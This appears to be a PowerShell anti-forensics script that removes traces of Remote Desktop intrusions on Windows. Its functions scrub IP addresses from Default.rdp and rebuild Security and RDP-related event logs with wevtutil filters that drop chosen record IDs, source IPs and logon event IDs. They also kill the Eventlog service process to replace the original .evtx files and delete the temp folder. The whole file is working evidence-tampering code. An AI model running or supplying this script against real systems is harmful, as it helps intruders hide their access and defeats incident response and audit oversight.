function ClearnDefaultRdp {
    $RdpDefault = [environment]::getfolderpath("mydocuments")+'\Default.rdp'
    # %userprofile%\documents\ => $env:userprofile"\documents\"
    write-host $RdpDefault
    $RdpDefaultDelIp = (Get-Content $RdpDefault)|Foreach-Object {$_ -replace [Regex]('\d+.\d+.\d+.\d+'), ''}
    # Remove-Item $RdpDefault -Recurse -Force 2>&1 | Out-Null
    Set-Content $RdpDefault -value $RdpDefaultDelIp
}

function ClearnEventRecordID {
    [CmdletBinding()]
    Param (
        [string]$EventLogName,
        [string]$EventType,
        [string]$EventRecordID
    )

    # Get EventLog path
    $SecurityRegPath = "Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\eventlog\Security"
    $SecurityFileRegValueFileName = (Get-ItemProperty -Path $SecurityRegPath -ErrorAction Stop).File
    $EventLogPath = $SecurityFileRegValueFileName.Replace("Security.evtx","")

    write-host "EventLogPath: " $EventLogPath
 
    # Save New.evtx
    wevtutil epl $EventLogName $EventLogPath$EventType"_.evtx" /q:"*[System[(EventRecordID!='"$EventRecordID"')]]" /ow:true

    # Replace string
    $EventLogName = $EventLogName.Replace("/","%4")

    # Kill Eventlog Service
    $EventlogSvchostPID = Get-WmiObject -Class win32_service -Filter "name = 'eventlog'" | select -exp ProcessId
    taskkill /F /PID $EventlogSvchostPID

    # Delete Old.evtx
    Remove-Item $EventLogPath$EventLogName".evtx" -recurse
    write-host "Remove: " $EventLogPath$EventLogName".evtx"
    # Rename New.evtx Old.evtx
	write-host "Rename: " $EventLogPath$EventType"_.evtx" $EventLogPath$EventLogName".evtx"
    ren $EventLogPath$EventType"_.evtx" $EventLogPath$EventLogName".evtx"
    # Start Eventlog Service
    net start eventlog
}


function ClearnIpAddress {
    [CmdletBinding()]
    Param (
        [string]$EventLogName,
        [string]$EventType,
        [string]$IpAddress
    )

    # Get EventLog path
    $SecurityRegPath = "Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\eventlog\Security"
    $SecurityFileRegValueFileName = (Get-ItemProperty -Path $SecurityRegPath -ErrorAction Stop).File
    $EventLogPath = $SecurityFileRegValueFileName.Replace("Security.evtx","")

    write-host $EventType

    # Save New.evtx
    if ($EventType -eq 'Security') {
        wevtutil epl $EventLogName $EventLogPath$EventType"_.evtx" /q:"*[EventData[(Data[@Name='IpAddress']!='"$IpAddress"')]]" /ow:true
    }
    if ($EventType -eq 'RemoteConnectionManager'){
        wevtutil epl $EventLogName $EventLogPath$EventType"_.evtx" /q:"*[System[(EventID !='1149')]]" /ow:true
    }
    if ($EventType -eq 'LocalSessionManager'){
        wevtutil epl $EventLogName $EventLogPath$EventType"_.evtx" /q:"*[System[(EventID !='21') and (EventID !='22') and (EventID !='24') and (EventID !='25')]]" /ow:true
    }
    if ($EventType -eq 'ClientActiveXCore'){
        wevtutil epl $EventLogName $EventLogPath$EventType"_.evtx" /q:"*[System[(EventID !='1024')]]" /ow:true
    }
    if ($EventType -eq 'RdpCoreTS'){
        wevtutil epl $EventLogName $EventLogPath$EventType"_.evtx" /q:"*[System[(EventID !='131') and (EventID !='140')]]" /ow:true
    }

    # Replace string
    $EventLogName = $EventLogName.Replace("/","%4")

    # Kill Eventlog Service
    $EventlogSvchostPID = Get-WmiObject -Class win32_service -Filter "name = 'eventlog'" | select -exp ProcessId
    taskkill /F /PID $EventlogSvchostPID

    # Delete Old.evtx
    Remove-Item $EventLogPath$EventLogName".evtx" -recurse

    # Rename New.evtx Old.evtx
    ren $EventLogPath$EventType"_.evtx" $EventLogPath$EventLogName".evtx"

    # Start Eventlog Service
    net start eventlog
}


function ClearnTempLog {
    $TempLogPath = $env:temp
    write-host $TempLogPath
    Remove-Item $TempLogPath"\*" -Recurse -Force 2>&1 | Out-Null
}